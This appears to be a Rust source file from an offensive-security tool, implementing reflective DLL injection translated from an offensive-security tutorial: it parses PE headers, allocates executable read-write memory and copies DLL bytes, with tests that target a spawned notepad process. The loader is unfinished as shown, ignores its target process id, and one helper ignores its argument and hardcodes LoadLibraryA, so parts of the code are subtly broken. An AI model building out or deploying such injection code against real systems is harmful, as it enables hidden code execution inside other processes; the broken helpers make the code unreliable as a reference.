use anyhow::Result;
use starlark::values::none::NoneType;

use windows_sys::Win32::System::Memory::VirtualAlloc;
#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Diagnostics::Debug::{IMAGE_NT_HEADERS64,IMAGE_NT_HEADERS32},
        SystemServices::{IMAGE_DOS_HEADER},
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{VirtualAllocEx,MEM_RESERVE,MEM_COMMIT,PAGE_EXECUTE_READWRITE},
    },
};
use std::mem;
use std::ptr;
#[cfg(target_os = "windows")]
use std::ffi::c_void;

fn get_module_handle_a(module_name: Option<String>) -> Result<isize> {
    unsafe {
        let module_handle = match module_name {
            Some(local_module_name) => {
                    GetModuleHandleA( format!("{}\0",local_module_name).as_str().as_ptr())
            },
            None => {
                    GetModuleHandleA(ptr::null())
            },
        };
        Ok(module_handle)    
    }
}

fn get_proc_address(hmodule: isize, proc_name: String) -> Result<unsafe extern "system" fn() -> isize> {
    unsafe {
        let proc_handle: unsafe extern "system" fn() -> isize = GetProcAddress(
            hmodule, 
            "LoadLibraryA\0".as_ptr()
        ).unwrap();
        Ok(proc_handle)
    }
}

fn get_u8_vec_form_u32_vec(u32_vec: Vec<u32>) -> Result<Vec<u8>> {
    let res_u8_vec: Vec<u8> = u32_vec.iter().map(|x| if *x < u8::MAX as u32 { *x as u8 }else{ u8::MAX }).collect();
    Ok(res_u8_vec)
}

fn get_dos_headers(dll_bytes_ref: usize) -> Result<* mut IMAGE_DOS_HEADER> {
    let dos_headers = dll_bytes_ref as *mut IMAGE_DOS_HEADER;
    if unsafe{*dos_headers}.e_magic != 23117 {
        Err(anyhow::anyhow!("PE Magic header mismatch. Likely using the wrong base reference or wrong file type."))
    } else {
        Ok(dos_headers)
    }
}

#[cfg(target_arch = "x86_64")]
fn get_nt_headers_64(dll_bytes_ref: usize) -> Result<* mut IMAGE_NT_HEADERS64> {
    let dos_headers = get_dos_headers(dll_bytes_ref)?;
    let nt_header_offset = unsafe{*dos_headers}.e_lfanew as usize;
    let nt_headers = (dll_bytes_ref + nt_header_offset) as *mut IMAGE_NT_HEADERS64;
    Ok(nt_headers)
}

#[cfg(target_arch = "x86")]
fn get_nt_headers_32(dll_bytes_ref: usize) -> Result<* mut IMAGE_NT_HEADERS32> {
    let dos_headers = get_dos_headers(dll_bytes_ref)?;
    let nt_header_offset = unsafe{*dos_headers}.e_lfanew as usize;
	let nt_headers = (dll_bytes_ref + nt_header_offset) as *mut IMAGE_NT_HEADERS32;
    Ok(nt_headers)
}

fn write_vec_to_memory(dst_mem_address: *mut c_void, src_vec_bytes: Vec<u8>, max_bytes_to_write: u32) -> Result<()>{
    let mut index: u32 = 0;
    for byte in src_vec_bytes{
        unsafe { ((dst_mem_address as usize+index as usize) as *mut c_void).write_bytes(byte, 1); }
        index = index + 1;
        if index >= max_bytes_to_write {
            break;
        }
    }
    Ok(())
}

// Translated from https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
pub fn handle_dll_reflect(dll_bytes: Vec<u8>, pid: u32) -> Result<NoneType> {
    println!();
    if false { println!("Ignore unused vars dll_path: {:?}, pid: {}", dll_bytes, pid); }
    #[cfg(not(target_os = "windows"))]
    return Err(anyhow::anyhow!("This OS isn't supported by the dll_reflect function.\nOnly windows systems are supported"));

    // The current base address of our module.
    let current_process_module_base = get_module_handle_a(None)?;

    // Get the kernel32.dll base address
    let h_kernel32 = get_module_handle_a(Some("kernel32.dll".to_string()))?;

    let dos_headers = get_dos_headers(dll_bytes.as_ptr() as usize)?;

    #[cfg(target_arch = "x86_64")]
    let nt_headers = get_nt_headers_64(dll_bytes.as_ptr() as usize)?;
    #[cfg(target_arch = "x86")]
    let nt_headers = get_nt_headers_32((dll_bytes.as_ptr() as usize))?;

    let dll_image_size = (unsafe{*nt_headers}).OptionalHeader.SizeOfImage;

    // Allocate memory for our DLL to be loaded into
    let new_dll_base = unsafe { VirtualAlloc(ptr::null(), dll_image_size as usize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };

    // Calculate the number of bytes between our images base and the newly allocated memory.
    let image_base_delta = (new_dll_base as usize) - (unsafe{*nt_headers}).OptionalHeader.ImageBase as usize;

    // copy over DLL image headers to the newly allocated space for the DLL
    write_vec_to_memory(new_dll_base, dll_bytes, (unsafe{*nt_headers}).OptionalHeader.SizeOfHeaders)?;

    Ok(NoneType)
}

pub fn dll_reflect(dll_bytes: Vec<u32>, pid: u32) -> Result<NoneType> {
    let local_dll_bytes = get_u8_vec_form_u32_vec(dll_bytes)?;
    handle_dll_reflect(local_dll_bytes, pid)
}

#[cfg(target_os = "windows")]
#[cfg(test)]
mod tests {
    use super::*;
    use core::time;
    use std::{process::Command, thread, path::Path, fs};
    use sysinfo::{Pid, Signal};
    use tempfile::NamedTempFile;
    use sysinfo::{ProcessExt,System,SystemExt,PidExt};

    #[test]
    fn test_dll_reflect_write_vec_to_mem() -> anyhow::Result<()>{
        // Get the path to our test dll file.
        let buf_size: usize = 16;
        let new_dll_base = unsafe { VirtualAlloc(ptr::null(), buf_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
        let test_buffer: Vec<u8> = vec![104, 101, 108, 108, 111, 95, 119, 111, 114, 108, 100, 95, 49, 50, 0];

        write_vec_to_memory(new_dll_base, test_buffer.clone(), buf_size as u32);

        let mut tmp_dll_base = new_dll_base.clone();
        for (index, byte) in test_buffer.iter().enumerate() {
            let res = unsafe { *(tmp_dll_base as *mut u8) };
            assert_eq!(*byte, res);
            tmp_dll_base = (tmp_dll_base as usize + 1 as usize) as *mut c_void;
        }
        Ok(())
    }

    #[test]
    fn test_dll_reflect_parse_header_nt() -> anyhow::Result<()>{
        // Get the path to our test dll file.
        let read_in_dll_bytes = include_bytes!("..\\..\\..\\..\\tests\\create_file_dll\\target\\debug\\create_file_dll.dll");
        let dll_bytes = read_in_dll_bytes.to_vec();

        let nt_headers = get_nt_headers_64(dll_bytes.as_ptr() as usize)?;
        // 0x020B == 523 --- NT Header Magic number for PE64
        assert_eq!(523, unsafe{*nt_headers}.OptionalHeader.Magic );

        Ok(())
    }

    #[test]
    fn test_dll_reflect_parse_header_dos() -> anyhow::Result<()>{
        // Get the path to our test dll file.
        let read_in_dll_bytes = include_bytes!("..\\..\\..\\..\\tests\\create_file_dll\\target\\debug\\create_file_dll.dll");
        let dll_bytes = read_in_dll_bytes.to_vec();

        let dos_headers = get_dos_headers(dll_bytes.as_ptr() as usize)?;
        // 0x5A4D == a"ZM" == d23117 --- PE Magic number is static.
        assert_eq!(23117, unsafe{*dos_headers}.e_magic );
        Ok(())
    }

    #[test]
    fn test_dll_reflect_simple() -> anyhow::Result<()>{
        const DLL_EXEC_WAIT_TIME: u64 = 5;
        // Get unique and unused temp file path
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap()).clone();
        tmp_file.close()?;

        // Get the path to our test dll file.
        let read_in_dll_bytes = include_bytes!("..\\..\\..\\..\\tests\\create_file_dll\\target\\debug\\create_file_dll.dll");
        let dll_bytes = read_in_dll_bytes.to_vec();

        // Out target process is notepad for stability and control.
        // The temp file is passed through an environment variable.
        let expected_process = Command::new("C:\\Windows\\System32\\notepad.exe").env("LIBTESTFILE", path.clone()).spawn();
        let target_pid = expected_process.unwrap().id();

        // Run our code.
        let _res = handle_dll_reflect(dll_bytes, target_pid)?;

        let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
        thread::sleep(delay);

        // Test that the test file was created
        let test_path = Path::new(path.as_str());
        assert!(test_path.is_file());

        // Delete test file
        let _ = fs::remove_file(test_path);
        
        // kill the target process notepad
        let mut sys = System::new();
        sys.refresh_processes();
        match sys.process(Pid::from_u32(target_pid)) {
            Some(res) => {
                res.kill_with(Signal::Kill);
            },
            None => {
            },
        }

        Ok(())
    }
}

